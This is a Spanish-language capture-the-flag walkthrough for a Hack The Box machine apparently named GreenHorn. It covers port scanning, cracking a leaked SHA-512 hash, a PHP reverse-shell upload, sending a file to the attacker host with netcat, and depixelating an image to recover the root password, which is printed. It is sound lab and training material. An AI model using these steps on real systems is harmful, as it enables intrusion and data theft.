
Iniciamos con un scaneo en [[00. Apuntes/01. Herramientas/NMAP|NMAP]]
`nmap -p- --open -sS -sCV --min-rate 5000 -vvv -Pn -n 10.10.11.47 -oG allPorts`

![[Pasted image 20241212110548 1.png]]

volvemos a hacer un scaneo con Nmap a los puertos abiertos
`nmap -p 22,80,3000 --open -sS -sCV --min-rate 5000 -vvv -Pn -n 10.10.11.47 -oN PortsScan`

Añadimos la IP de la maquina al fichero `/etc/hosts`
`echo "10.10.11.25 greenhorn.htb" | sudo tee -a /etc/hosts`

Ahora una vez navegamos a la IP y encontramos lo siguiente

![[Pasted image 20241212111752 1.png]]

Si navegamos al botón que pone abajo admin encontramos un login con PHP
![[Pasted image 20241212111843 1.png]]


También podemos navegar a la IP con el puerto 3000 y encontramos lo siguiente
![[Pasted image 20241212112007 1.png]]

Navegamos por la web y en el apartado de explore nos encontramos un repositorio en PHP
![[Pasted image 20241212112104 1.png]]

Lo abrimos y encontramos lo siguiente
![[Pasted image 20241212112145 1.png]]
Dentro encontramos el código de login.php, una vez dentro de el encontramos que utiliza como has la codificación `sha512` 

![[Pasted image 20241212114043 1.png]]

Y también vemos los ficheros que necesita este login.php para funcionar

![[Pasted image 20241212114203 1.png]]

Podemos navegar al repositorio y ver que contiene una vez estamos en el vemos que contienen el hash en `sha512` 

![[Pasted image 20241212114348 1.png]]

Copiamos el código en un fichero que lo llamamos `hash.txt`
`echo "d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163" > hash.txt

Ahora vamos a usar John the Ripper para hashear la contraseña y sacarla en texto claro
`john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512 hash.txt`

![[Pasted image 20241212114705 1.png]]

Encontramos la contraseña y podemos acceder al panel de admin con la contraseña encontrada.

![[Pasted image 20241212111843 1.png]]

![[Pasted image 20241212115004 1.png]]
![[Pasted image 20241212115029 1.png]]
![[Pasted image 20241212115049 1.png]]

Vamos a hacer una reverse shell con php accediendo al github de pentestmonkey, https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php ,
Modificamos los datos necesarios.

![[Pasted image 20241212115400 1.png]]

Usaremos el puerto 443 para escuchar en el y desde hay obtener la reverse shell
Nos ponemos en escucha en el puerto elegido.
`nc -lvnp 443`

Creamos un zip del archivo php que es el que deja subir a la web 
`zip reverse.zip reverse.php `
Y subimos el fichero zip que nos otorga reverse shell a la web
Conseguimos acceso
![[Pasted image 20241212115932 1.png]]

Ahora procederemos a realizar la escalada de privilegios
Primero nos generamos una bash para poder trabajar mejor
`script /dev/null -c /bin/bash`

Navegamos a /home y vemos varios usuarios
![[Pasted image 20241212120315 1.png]]

Suponemos que la contraseña del usuario junior de la misma que la de el panel de login, iniciamos sesión con junior y la contraseña antes obtenida
`su junior`
![[Pasted image 20241212120450 1.png]]

Obtenemos acceso al usuario junior, navegamos a su directorio y obtenemos la primera flag.

Ahora obtendremos privilegios para el usuario root.
En el directorio vemos un fichero llamado "Using OpenVAS.pdf" nos lo transferimos por Netcat, en la maquina anfitriona usamos
`nc -lvnp 443 > 'Using OpenVAS.pdf'`

Y en la maquina victima usamos el siguiente comando
`cat 'Using OpenVAS.pdf' | nc 10.10.16.16 443`

 Cuando acabe la transferencia abrimos el fichero .pdf y nos encontramos lo siguiente
 ![[Pasted image 20241212122006 1.png]]

Descargamos una herramienta de github que despixela datos en imágenes, la herramienta se llama Depix, guardamos la parte del pixelado como image.png y usamos la herramienta descargada desde su direcctorio de descarga.
`python3 depix.py -p /home/jalag/Desktop/image.png -s ./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o /home/jalag/Desktop/output.png`

Y obtenemos la imagen despixelada
![[Pasted image 20241212123500 1.png]]
`sidefromsidetheothersidesidefromsidetheotherside`

Esta es la es contraseña, entramos como root en la reverse shell que tenemos
`su root`

Obtenemos una sesión como root
![[Pasted image 20241212124023 1.png]]

Y obtenemos la flag de root.


 